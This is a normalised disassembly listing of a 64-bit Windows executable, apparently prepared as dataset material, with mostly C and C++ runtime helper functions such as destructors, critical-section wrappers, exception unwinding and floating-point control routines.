jmp sub_140038314
sub_140002e40
movzx eax dx
lea rdx [ rcx + 0x10 ]
movzx ecx ax
jmp sub_140038384
j_sub_14003a7e8
jmp sub_14003a7e8
sub_1400037c0
push rbx
sub rsp 0x20
lea rbx [ rcx + 0x98 ]
mov rcx rbx
call sub_140003cd0
lea r11 [ r--data ]
mov rcx rbx
mov [ rbx ] r11
add rsp 0x20
pop rbx
jmp sub_140037d08
sub_1400037f0
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
test rcx rcx
je r-xdata
mov [ rbx ] 0x0
add rsp 0x20
pop rbx
retn
call sub_14003ad04
sub_140003820
lea rax [ r--data ]
mov [ rcx ] rax
jmp sub_140037d08
sub_140003830
mov rax [ rcx - 0x10 ]
movsxd rdx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rdx + rcx - 0x10 ] rax
retn
sub_1400038f0
add rcx 0x8
jmp sub_1400382fc
sub_140003900
mov eax 0xffff
retn
sub_140003b10
mov rax [ r--data ]
mov [ rdx ] rax
xor eax eax
mov [ rdx + 0x8 ] rax
mov [ rdx + 0x10 ] eax
mov rax rdx
retn
sub_140004720
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
xor eax eax
cdqe
retn
mov rax [ rcx + 0x60 ]
movsxd rax [ rax ]
retn
sub_140005dc0
cmp [ rcx + 0x18 ] 0x10
jb r-xdata
mov rax rcx
retn
mov rax [ rcx ]
retn
sub_140006ad0
sub rsp 0x28
mov rdx [ rcx ]
mov rax [ rdx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rdx + 0x48 ]
test rcx rcx
je r-xdata
add rsp 0x28
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
j_sub_1400070d0
jmp sub_1400070d0
sub_14000a430
push rbx
sub rsp 0x20
mov rax [ rcx ]
mov rbx rdx
mov [ rsp + 0x30 ] 0x0
call [ rax + 0x20 ]
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_14000a450
movzx eax [ rcx + 0x18 ]
retn
sub_14000a460
movzx eax [ rcx + 0x1a ]
retn
j_sub_14000d6c0
jmp sub_14000d6c0
sub_140010250
movzx eax dl
lea rdx [ rcx + 0x10 ]
mov ecx eax
jmp sub_140038790
sub_1400102b0
movzx eax dl
lea rdx [ rcx + 0x10 ]
mov ecx eax
jmp sub_140039e84
sub_140010310
movzx eax dl
retn
sub_140010320
push rbx
sub rsp 0x20
mov rbx r8
mov rcx r9
sub r8 rdx
call sub_14003a8c0
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_140010340
push rbx
sub rsp 0x20
mov rcx [ rsp + 0x50 ]
mov rbx r8
sub r8 rdx
call sub_14003a8c0
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_1400106b0
add rcx 0x8
jmp sub_140038304
sub_1400106c0
or eax 0xffffffff
retn
sub_1400106d0
xor eax eax
retn
sub_1400108a0
mov rax rcx
retn
sub_140010fd0
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
xor eax eax
cdqe
retn
mov rax [ rcx + 0x58 ]
movsxd rax [ rax ]
retn
sub_1400112c0
sub rsp 0x38
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
test [ rdx + rcx + 0x18 ] 0x2
je r-xdata
add rsp 0x38
retn
call sub_1400103c0
nop
sub_140016300
sub rsp 0x28
mov rax [ rcx + 0x8 ]
cmp [ rcx ] rax
setne cl
xor edx edx
call sub_140016bb0
mov al 0x1
add rsp 0x28
retn
sub_140016320
sub rsp 0x28
mov rax [ rcx + 0x8 ]
mov dl 0x1
cmp [ rcx ] rax
setne cl
call sub_140016bb0
mov al 0x1
add rsp 0x28
retn
sub_14001ec90
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
test dl 0x1
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
call j_sub_14003ad04
sub_140023d60
sub rsp 0x28
mov edx 0x2
call sub_140024080
mov al 0x1
add rsp 0x28
retn
sub_140023d80
sub rsp 0x28
mov edx 0x4
call sub_140024080
mov al 0x1
add rsp 0x28
retn
sub_140023da0
sub rsp 0x28
xor edx edx
call sub_140024080
mov al 0x1
add rsp 0x28
retn
sub_140028fd0
mov rax [ rcx - 0x10 ]
movsxd rdx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rdx + rcx - 0x10 ] rax
retn
sub_140029190
push rbx
sub rsp 0x20
add rcx 0x18
mov rbx rdx
mov [ rsp + 0x30 ] 0x0
call sub_140010ff0
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_14002aea0
push rbx
sub rsp 0x20
mov rax [ rcx ]
mov rbx rdx
mov [ rsp + 0x30 ] 0x0
call [ rax + 0x28 ]
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_14002aec0
movzx eax [ rcx + 0x18 ]
retn
sub_14002aed0
movzx eax [ rcx + 0x19 ]
retn
sub_14002b150
push rbx
sub rsp 0x20
mov rax [ rcx ]
mov rbx rdx
mov [ rsp + 0x30 ] 0x0
call [ rax + 0x18 ]
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_14002de00
xor al al
retn
sub_14002de10
sub rsp 0x28
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
mov al 0x1
add rsp 0x28
retn
sub_14002de40
sub rsp 0x28
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
mov al 0x1
add rsp 0x28
retn
j_sub_140030690
jmp sub_140030690
sub_140031e80
sub rsp 0x28
mov ecx 0x10
call sub_140031ee0
mov al 0x1
add rsp 0x28
retn
sub_140031ea0
sub rsp 0x28
mov ecx 0x18
call sub_140031ee0
mov al 0x1
add rsp 0x28
retn
sub_140031ec0
sub rsp 0x28
mov ecx 0x20
call sub_140031ee0
mov al 0x1
add rsp 0x28
retn
sub_1400326e0
mov eax 0x28
call sub_14003d700
sub rsp rax
cmp [ rw-data ] 0x0
je r-xdata
call sub_1400323b0
xor eax eax
add rsp 0x28
retn
add rsp 0x28
jmp sub_140032660
sub_140032a00
mov [ rsp + 0x8 ] rdi
mov [ rsp + 0x10 ] rsi
mov rax rsp
sub_140032e80
mov [ rsp + 0x8 ] rdi
mov [ rsp + 0x10 ] rsi
mov rax rsp
sub_140032f70
lea rax [ r-xdata ]
mov edx [ rw-data ]
bt edx 0x14
jae r-xdata
retn
add rax 0xc
bt edx 0x1e
jae r-xdata
add rax 0xd
sub_140033240
mov [ rsp + 0x8 ] rdi
mov [ rsp + 0x10 ] rsi
mov rax rsp
sub_140033c60
xor eax eax
cmp [ rcx ] al
je r-xdata
btr eax 0x1f
retn
cmp eax 0x80000000
jae r-xdata
inc rcx
inc eax
cmp [ rcx ] 0x0
jne r-xdata
sub_140033e90
mov eax 0x28
call sub_14003d700
sub rsp rax
lea r8d [ rax - 0x18 ]
add rsp 0x28
jmp sub_14003d8f0
sub_140033ec0
mov eax [ rcx + 0x8 ]
retn
sub_1400348b0
mov eax 0x28
call sub_14003d700
sub rsp rax
add rsp 0x28
jmp [ rw-data ]
sub_1400348d0
mov eax 0x28
call sub_14003d700
sub rsp rax
add rsp 0x28
jmp [ rw-data ]
sub_1400348f0
mov eax 0x28
call sub_14003d700
sub rsp rax
add rsp 0x28
jmp [ rw-data ]
sub_140034c70
mov eax 0x28
call sub_14003d700
sub rsp rax
mov r8d [ rcx ]
add rsp 0x28
jmp sub_140034b80
sub_140034d20
mov eax 0x28
call sub_14003d700
sub rsp rax
xor ecx ecx
add rsp 0x28
jmp sub_140034ae0
sub_140035210
mov eax 0x28
call sub_14003d700
sub rsp rax
call sub_140033ec0
imul eax eax 0xd
add rsp 0x28
retn
sub_140035230
mov eax 0x28
call sub_14003d700
sub rsp rax
add rsp 0x28
jmp sub_140033e90
sub_140035a40
mov eax [ rcx ]
lea r8 [ rdx + rax ]
[ rcx ] r8d
jne r-xdata
mov eax r8d
cdqe
retn
sub_140035a60
rdtsc
shl rdx 0x20
or rax rdx
retn
sub_140036140
not edx
and [ rcx + 0x20 ] edx
retn
sub_140036480
test rcx rcx
je r-xdata
xor eax eax
retn
mov eax [ rcx + 0x30 ]
retn
sub_140036860
xor eax eax
mov [ rcx + 0x18 ] eax
mov [ rcx + 0x28 ] eax
mov [ rcx + 0x30 ] rax
mov [ rcx + 0x20 ] eax
mov eax 0x1
retn
sub_140036e00
mov eax [ rcx ]
retn
sub_140036e10
mov eax [ rcx ]
sub eax [ rdx ]
retn
sub_140036ea0
mov eax 0x28
call sub_14003d700
sub rsp rax
add rsp 0x28
jmp sub_140034a90
sub_140036ec0
push rbx
mov eax 0x20
call sub_14003d700
sub rsp rax
mov rbx rcx
mov rcx [ rcx + 0x8 ]
lea rdx [ sub_140036ea0 ]
call sub_140034d40
mov rcx rbx
add rsp 0x20
pop rbx
jmp sub_140034a90
j_sub_14003a7e8#2
jmp sub_14003a7e8
sub_1400378c8
push rbx
sub rsp 0x20
mov rbx rcx
call sub_14003a824
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_1400378ec
sub rsp 0x48
mov [ rsp + 0x50 ] rcx
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x20 ]
call sub_14003a774
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_14003f22c
int3
sub_140037924
push rbx
sub rsp 0x20
mov rbx rcx
call sub_14003a824
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_140037948
sub rsp 0x48
mov [ rsp + 0x50 ] rcx
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x20 ]
call sub_14003a774
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_14003f22c
int3
sub_140037980
push rbx
sub rsp 0x20
mov rbx rcx
call sub_14003a824
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
j_sub_14003ac60
jmp sub_14003ac60
sub_140037a98
sub rsp 0x28
call sub_14003f768
mov ecx [ rax + 0x8 ]
mov [ rsp + 0x30 ] ecx
call sub_14003f730
mov [ rsp + 0x34 ] eax
mov rax [ rsp + 0x30 ]
add rsp 0x28
retn
sub_140037abc
mov [ rdx ] r8d
mov [ rdx + 0x8 ] rcx
mov rax rdx
retn
sub_140037b00
cmp rcx [ rdx + 0x8 ]
jne r-xdata
xor eax eax
retn
cmp [ rdx ] r8d
jne r-xdata
mov eax 0x1
retn
sub_140037b14
mov rax [ rcx + 0x8 ]
retn
sub_140037b1c
mov rax [ rcx + 0x10 ]
retn
sub_140037b24
lea rax [ rw-data ]
retn
sub_140037b2c
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
test dl 0x1
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
call j_sub_14003ad04
sub_140037e54
sub rsp 0x28
lea rcx [ rsp + 0x30 ]
xor edx edx
call sub_14003825c
lea rcx [ rw-data ]
call sub_140037dec
and [ rw-data ] 0x0
lea rcx [ rsp + 0x30 ]
call sub_14003828c
add rsp 0x28
retn
sub_140037e88
mov rax [ rw-data ]
retn
sub_140037e90
push rbx
sub rsp 0x20
cmp [ rw-data ] 0x0
mov rbx rcx
jne r-xdata
mov [ rw-data ] rbx
add rsp 0x20
pop rbx
retn
lea rcx [ sub_140037e54 ]
mov [ rw-data ] 0x1
call sub_14003a624
sub_140037f70
sub rsp 0x28
mov rdx [ rcx + 0x28 ]
test rdx rdx
je r-xdata
add rsp 0x28
retn
xor ecx ecx
call sub_14003ce60
sub_1400382b4
push rbx
sub rsp 0x20
mov rbx rcx
mov ecx 0x28
call sub_14003ac60
mov rcx rax
mov [ rbx ] rax
call InitializeCriticalSection
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_1400382dc
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
call DeleteCriticalSection
mov rcx [ rbx ]
add rsp 0x20
pop rbx
jmp j_sub_14003ad04
sub_1400382fc
mov rcx [ rcx ]
jmp EnterCriticalSection
sub_140038304
mov rcx [ rcx ]
jmp LeaveCriticalSection
j_sub_14004042c
jmp sub_14004042c
sub_140038588
sub rsp 0x28
lea rcx [ sub_140038520 ]
call sub_14004005c
neg eax
sbb eax eax
and eax 0x18
add rsp 0x28
retn
sub_140038aa8
mov eax 0x1
retn
sub_140038ab0
sub rsp 0x28
mov rcx [ rcx + 0x98 ]
test rcx rcx
je r-xdata
add rsp 0x28
retn
call sub_14003bd5c
sub_140038acc
sub rsp 0x28
mov rcx [ rcx + 0x98 ]
test rcx rcx
je r-xdata
add rsp 0x28
retn
call sub_14003bdf4
sub_140038e9c
xor al al
retn
sub_140038ea0
mov eax 0x5
retn
sub_140038ea8
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
test dl 0x1
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
call j_sub_14003ad04
sub_140039394
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx rdx
call sub_140039168
mov rcx rbx
mov rdx rax
add rsp 0x20
pop rbx
jmp sub_1400390d8
sub_140039e68
mov [ rcx + 0x28 ] rdx
retn
sub_140039e70
lea rax [ sub_140039e68 ]
mov [ rcx + 0x8 ] rdx
mov [ rcx ] rax
mov rax rcx
retn
sub_14003a0a4
sub rsp 0x28
call sub_14003a580
cvtsd2ss xmm0 xmm0
add rsp 0x28
retn
j_sub_14003a580
jmp sub_14003a580
InitializeCriticalSection
jmp [ InitializeCriticalSection@IAT ]
DeleteCriticalSection
jmp [ DeleteCriticalSection@IAT ]
EnterCriticalSection
jmp [ EnterCriticalSection@IAT ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
sub_14003a6a0
cmp rcx [ rw-data ]
jne r-xdata
jmp sub_140042c80
rol rcx 0x10
test cx 0xffff
jne r-xdata
ror rcx 0x10
retn
sub_14003a6c0
lea rax [ r--data ]
mov [ rcx ] rax
mov rax [ rdx ]
mov [ rcx + 0x10 ] 0x0
mov [ rcx + 0x8 ] rax
mov rax rcx
retn
sub_14003a6dc
cmp [ rcx + 0x8 ] 0x0
lea rax [ r--data ]
cmovne rax [ rcx + 0x8 ]
retn
sub_14003a74c
push rbx
sub rsp 0x20
cmp [ rcx + 0x10 ] 0x0
mov rbx rcx
je r-xdata
and [ rbx + 0x8 ] 0x0
mov [ rbx + 0x10 ] 0x0
add rsp 0x20
pop rbx
retn
mov rcx [ rcx + 0x8 ]
call sub_14003ad04
sub_14003a7e8
lea rax [ r--data ]
mov [ rcx ] rax
jmp sub_14003a74c
sub_14003a7f8
mov [ rsp + 0x10 ] rdx
push rbx
sub rsp 0x20
lea rdx [ rsp + 0x38 ]
mov rbx rcx
call sub_14003a774
lea r11 [ r--data ]
mov rax rbx
mov [ rbx ] r11
add rsp 0x20
pop rbx
retn
sub_14003a824
push rbx
sub rsp 0x20
and [ rcx + 0x8 ] 0x0
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
mov [ rcx + 0x10 ] 0x0
call sub_14003a7a4
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_14003a88c
push rbx
sub rsp 0x20
mov rbx rcx
call sub_14003a824
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
j_sub_14003ad04
jmp sub_14003ad04
sub_14003ac40
sub rsp 0x28
mov rax rdx
lea rdx [ rcx + 0x11 ]
lea rcx [ rax + 0x11 ]
call sub_14003e9f0
test eax eax
sete al
add rsp 0x28
retn
sub_14003b2fc
sub rsp 0x38
mov [ rsp + 0x20 ] r9
mov r9 r8
mov r8 rdx
or rdx 0xffffffffffffffff
call sub_14003b254
add rsp 0x38
retn
sub_14003b81c
mov r11 rsp
mov [ r11 + 0x18 ] r8
mov [ r11 + 0x20 ] r9
sub rsp 0x38
lea rax [ r11 + 0x20 ]
xor r9d r9d
mov [ r11 - 0x18 ] rax
call sub_140045bb8
add rsp 0x38
retn
sub_14003b840
test r8 r8
je r-xdata
neg r8
sbb rax rax
and rax rcx
retn
cmp [ rcx ] dl
je r-xdata
inc rcx
dec r8
jne r-xdata
sub_14003b85c
sub rsp 0x28
call sub_140043c34
mov rcx [ rw-data ]
cmp [ rax + 0xc0 ] rcx
je r-xdata
mov rax [ rw-data ]
add rsp 0x28
retn
mov eax [ rax + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
call sub_140045f2c
sub_14003bd34
sub rsp 0x28
call sub_14003ef04
cmp [ rw-data ] 0x0
je r-xdata
mov rcx [ rw-data ]
add rsp 0x28
jmp sub_14003ad04
call sub_140046990
sub_14003be40
cmp ecx 0x14
jge r-xdata
lea rcx [ rdx + 0x30 ]
jmp [ LeaveCriticalSection@IAT ]
btr [ rdx + 0x18 ] 0xf
add ecx 0x10
jmp sub_140046b48
sub_14003d01c
xor edx edx
lea r8d [ rdx + 0xa ]
jmp sub_140049a5c
_start
sub rsp 0x28
call sub_14004bf80
add rsp 0x28
jmp sub_14003d55c
j_sub_14003d84c
jmp sub_14003d84c
sub_14003db2c
sub rsp 0x28
mov r8 [ r9 + 0x38 ]
mov rcx rdx
mov rdx r9
call sub_14003dac8
mov eax 0x1
add rsp 0x28
retn
sub_14003dcac
sub rsp 0x38
mov [ rsp + 0x20 ] r9
xor r9d r9d
call sub_14003dbb0
add rsp 0x38
retn
sub_14003de08
sub rsp 0x38
mov [ rsp + 0x20 ] r8
mov r8 rdx
mov rdx rcx
lea rcx [ sub_140045024 ]
xor r9d r9d
call sub_14003dcc4
add rsp 0x38
retn
sub_14003de68
push rbx
sub rsp 0x20
mov ebx ecx
call sub_14003de2c
mov ecx ebx
call [ ExitProcess@IAT ]
sub_14003de80
mov ecx 0x8
jmp sub_140046c48
sub_14003de8c
mov ecx 0x8
jmp sub_140046b48
sub_14003e18c
xor r8d r8d
xor edx edx
jmp sub_14003dffc
sub_14003e198
xor r8d r8d
lea edx [ r8 + 0x1 ]
jmp sub_14003dffc
sub_14003e1a4
xor edx edx
xor ecx ecx
lea r8d [ rdx + 0x1 ]
jmp sub_14003dffc
sub_14003e1b4
mov edx 0x1
xor ecx ecx
mov r8d edx
jmp sub_14003dffc
sub_14003e1c4
push rbx
sub rsp 0x20
mov ebx ecx
call sub_140043a80
mov ecx ebx
call sub_140043820
xor r8d r8d
mov ecx 0xff
lea edx [ r8 + 0x1 ]
call sub_14003dffc
int3
sub_14003e1ec
mov [ rw-data ] rcx
mov [ rw-data ] rcx
mov [ rw-data ] rcx
mov [ rw-data ] rcx
retn
sub_14003e20c
mov rcx [ rw-data ]
jmp [ DecodePointer@IAT ]
sub_14003ea98
sbb rax rax
sbb rax 0xffffffffffffffff
retn
sub_14003eaa0
sub rsp 0x28
test rcx rcx
jne r-xdata
mov eax [ rcx + 0x18 ]
and eax 0x10
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
xor eax eax
jmp r-xdata
add rsp 0x28
retn
sub_14003eac8
sub rsp 0x28
test rcx rcx
jne r-xdata
mov eax [ rcx + 0x18 ]
and eax 0x20
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
xor eax eax
jmp r-xdata
add rsp 0x28
retn
sub_14003ef04
mov ecx 0x1
jmp sub_14003edd4
sub_14003efe8
mov r8d 0x40
jmp sub_14003ef10
sub_14003f71c
test rcx rcx
jne r-xdata
mov rax [ rcx ]
mov eax [ rax + 0x10c ]
retn
jmp sub_14003f6e0
sub_14003f9b4
push rbx
sub rsp 0x20
mov rbx rcx
call sub_140043c34
mov [ rax + 0x128 ] rbx
add rsp 0x20
pop rbx
retn
sub_14003f9d0
push rbx
sub rsp 0x20
mov rbx rcx
call sub_140043c34
mov [ rax + 0x130 ] rbx
add rsp 0x20
pop rbx
retn
sub_14004005c
sub rsp 0x28
call sub_14003ff50
neg rax
sbb eax eax
neg eax
dec eax
add rsp 0x28
retn
sub_140040074
lea rax [ r--data ]
mov [ rcx ] rax
jmp sub_14003a7e8
sub_1400403fb
call sub_14004e7c8
sub_14004042c
sub rsp 0x28
call sub_140043c34
xor ecx ecx
cmp [ rax + 0x100 ] ecx
setne al
add rsp 0x28
retn
sub_140040910
call sub_14004e7c8
sub_1400409ce
call sub_14004e7c8
sub_1400411b0
push rbx
sub rsp 0x20
mov rbx rcx
call sub_14003a824
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_140041550
sub rsp 0x38
cmp r9d 0xa
jne r-xdata
and [ rsp + 0x20 ] 0x0
test ecx ecx
jns r-xdata
mov [ rsp + 0x20 ] 0x1
jmp r-xdata
call sub_14004145c
add rsp 0x38
retn
sub_140041670
sub rsp 0x38
and [ rsp + 0x20 ] 0x0
call sub_140041578
add rsp 0x38
retn
sub_140042c1c
xor r8d r8d
jmp sub_140042ab0
sub_140042c64
mov eax [ rw-data ]
mov r8d edx
and ecx edx
not r8d
and r8d eax
or r8d ecx
mov [ rw-data ] r8d
retn
sub_140042e9c
mov [ rw-data ] rcx
retn
sub_140043568
mov [ rw-data ] rcx
retn
sub_140043790
sub rsp 0x4d8
xor r8 r8
xor r9 r9
mov [ rsp + 0x20 ] rsp
mov [ rsp + 0x28 ] r8
call RtlUnwindEx
add rsp 0x4d8
retn
sub_1400437e0
retn
sub_1400437f0
retn
EncodePointer
xor ecx ecx
jmp [ EncodePointer@IAT ]
sub_140043ad0
sub rsp 0x28
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
add rsp 0x28
jmp sub_140046ac0
call [ FlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_1400467c4
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
add rsp 0x28
retn
mov ecx 0xfffffffd
call sub_1400465e4
mov [ rw-data ] 0x1
sub_140046f04
movsxd rdx ecx
lea rcx [ rw-data ]
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
mov rax [ rcx + rax * 8 ]
lea rcx [ rax + rdx + 0x10 ]
jmp [ LeaveCriticalSection@IAT ]
sub_140049a5c
xor r9d r9d
jmp sub_140049874
sub_14004a294
movsd [ rsp + 0x8 ] xmm0
mov rdx 0x8000000000000000
mov rcx [ rsp + 0x8 ]
movsd [ rsp + 0x8 ] xmm1
mov rax [ rsp + 0x8 ]
xor rax rcx
test rdx rax
je r-xdata
retn
xor rcx rdx
mov [ rsp + 0x8 ] rcx
movsd xmm0 [ rsp + 0x8 ]
sub_14004a4b8
sub rsp 0x28
call sub_140051a60
and eax 0x3f
add rsp 0x28
retn
sub_14004a4cc
push rbx
sub rsp 0x20
call sub_140051a60
mov ebx eax
and ebx 0x3f
call sub_140051a7a
mov eax ebx
add rsp 0x20
pop rbx
retn
sub_14004a568
push rbx
sub rsp 0x20
mov rbx rcx
call sub_140051a60
and ebx 0x3f
or eax ebx
mov ecx eax
add rsp 0x20
pop rbx
jmp sub_140051a70
sub_14004b8e0
sub rsp 0x28
lea rcx [ sub_14004b89c ]
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
add rsp 0x28
retn
sub_14004c154
movsd xmm0 [ rcx ]
comisd xmm0 [ r--data ]
jb r-xdata
xor eax eax
retn
mov eax 0x1
retn
sub_14004c1b0
xor r9d r9d
jmp sub_14004c16c
sub_14004c1b8
xor edx edx
jmp sub_14004c034
sub_14004c1c0
xor edx edx
jmp sub_14004c0b4
sub_14004cd10
sub rsp 0x48
mov eax [ rsp + 0x78 ]
and [ rsp + 0x30 ] 0x0
mov [ rsp + 0x28 ] eax
mov eax [ rsp + 0x70 ]
mov [ rsp + 0x20 ] eax
call sub_14004cc78
add rsp 0x48
retn
sub_14004ce70
xor r9d r9d
jmp sub_14004cd6c
sub_14004cf6c
xor eax eax
test rdx rdx
je r-xdata
retn
cmp [ rcx ] 0x0
je r-xdata
inc rax
inc rcx
cmp rax rdx
jb r-xdata
sub_14004e7c8
sub rsp 0x28
call sub_140043c34
mov rcx [ rax + 0xd0 ]
test rcx rcx
je r-xdata
call sub_140042c24
call rcx
jmp r-xdata
sub_14004e7e6
add rsp 0x28
retn
sub_14004e80c
add rsp 0x28
retn
sub_14004e814
sub rsp 0x28
lea rcx [ sub_14004e7c8 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
add rsp 0x28
retn
sub_14004e834
mov [ rw-data ] rcx
retn
sub_14004ea18
mov [ rw-data ] rcx
retn
sub_14004eae4
lea rax [ rw-data ]
retn
sub_14004eaec
lea rax [ rw-data ]
retn
sub_14004f750
mov r8 [ rdx ]
jmp sub_14004f6c4
sub_14004f758
sub rsp 0x28
movsxd r9 [ r8 + 0x1c ]
mov rax [ rcx ]
mov r10 r8
mov eax [ r9 + rax ]
cmp eax 0xfffffffe
jne r-xdata
add rsp 0x28
retn
mov r8 [ rdx ]
mov rcx r10
call sub_14004f6c4
sub_14004f780
movsxd rdx [ r8 + 0x1c ]
mov rax [ rcx ]
mov [ rdx + rax ] r9d
retn
sub_14004f7c8
push rbx
sub rsp 0x20
lea r9 [ rsp + 0x40 ]
mov rbx r8
call sub_14003f898
mov rcx [ rax ]
movsxd rax [ rbx + 0x1c ]
mov [ rsp + 0x40 ] rcx
mov eax [ rax + rcx + 0x4 ]
add rsp 0x20
pop rbx
retn
sub_14004f880
mov rax [ rsp ]
mov [ rcx ] rax
retn
sub_14004f888
neg rcx
sbb eax eax
and eax 0x1
retn
sub_14004f894
xor r8d r8d
mov eax r8d
test rdx rdx
je r-xdata
retn
cmp [ rcx ] r8w
je r-xdata
inc rax
add rcx 0x2
cmp rax rdx
jb r-xdata
sub_14004fcb0
xor r9d r9d
jmp sub_14004fb38
sub_14005009c
sub rsp 0x38
and [ rsp + 0x20 ] 0x0
call sub_14004fed8
add rsp 0x38
retn
sub_140050694
and [ rw-data ] 0x0
retn
sub_140051528
mov rcx [ rw-data ]
xor eax eax
or rcx 0x1
cmp [ rw-data ] rcx
sete al
retn
sub_140051704
xor edx edx
lea r8d [ rdx + 0xa ]
jmp sub_14003d4f8
sub_140051a44
xor eax eax
retn
sub_140051a60
sub rsp 0x8
stmxcsr [ rsp ]
mov eax [ rsp ]
add rsp 0x8
retn
sub_140051a70
mov [ rsp + 0x8 ] ecx
ldmxcsr [ rsp + 0x8 ]
retn
sub_140051a7a
stmxcsr [ rsp + 0x8 ]
mov ecx 0xffffffc0
and [ rsp + 0x8 ] ecx
ldmxcsr [ rsp + 0x8 ]
retn
sub_140051a8e
ucomisd xmm0 [ r--data ]
jae r-xdata
retn
ucomisd xmm0 [ r--data ]
jbe r-xdata
cvtsd2si rcx xmm0
cvtsi2sd xmm0 rcx
sub_140053454
xor r9d r9d
jmp sub_14005326c
sub_1400535bc
xor r9d r9d
jmp sub_14005345c
sub_140055760
xor r8d r8d
jmp sub_140055674
sub_140055768
sub rsp 0x48
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
mov r8d 0x3
lea rcx [ r--data ]
xor r9d r9d
mov edx 0x40000000
mov [ rsp + 0x20 ] r8d
call [ CreateFileW@IAT ]
mov [ rw-data ] rax
add rsp 0x48
retn
sub_1400557a4
sub rsp 0x28
mov rcx [ rw-data ]
cmp rcx 0xffffffffffffffff
je r-xdata
add rsp 0x28
retn
cmp rcx 0xfffffffffffffffe
je r-xdata
call [ CloseHandle@IAT ]
RtlVirtualUnwind
jmp [ RtlVirtualUnwind@IAT ]
RtlPcToFileHeader
jmp [ RtlPcToFileHeader@IAT ]
RtlLookupFunctionEntry
jmp [ RtlLookupFunctionEntry@IAT ]
RtlUnwindEx
jmp [ RtlUnwindEx@IAT ]
sub_140055a10
lea rcx [ rdx + 0x58 ]
jmp sub_14003828c
sub_140055a1c
mov rcx [ rdx + 0x40 ]
jmp sub_140002ae0
sub_140055a2c
mov rcx [ rdx + 0x40 ]
add rcx 0x28
jmp sub_1400037f0
sub_140055a3c
lea rcx [ rdx + 0x48 ]
jmp sub_14003828c
sub_140055a48
lea rcx [ rdx + 0x40 ]
jmp sub_14003828c
sub_140055a54
mov rcx [ rdx + 0x80 ]
jmp j_sub_14003ad04
sub_140055a60
lea rcx [ rdx + 0x68 ]
jmp sub_14003828c
sub_140055a6c
lea rcx [ rdx + 0x40 ]
jmp sub_140005c50
sub_140055a78
lea rcx [ rdx + 0x60 ]
jmp sub_140005c50
sub_140055a84
mov rcx [ rdx + 0x40 ]
jmp sub_140003850
sub_140055aea
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x50 ]
call sub_14003bdf4
nop
add rsp 0x20
pop rbp
retn
sub_140055b04
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0x60 ]
call sub_14003bdf4
nop
add rsp 0x30
pop rbp
retn
sub_140055b1e
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x30 ]
call sub_14003bdf4
nop
add rsp 0x20
pop rbp
retn
sub_140055b38
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xd
call sub_140046b48
nop
add rsp 0x20
pop rbp
retn
sub_140055b58
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_140046b48
nop
add rsp 0x20
pop rbp
retn
sub_140055b73
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_140046b48
nop
add rsp 0x20
pop rbp
retn
sub_140055b93
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_140046b48
nop
add rsp 0x20
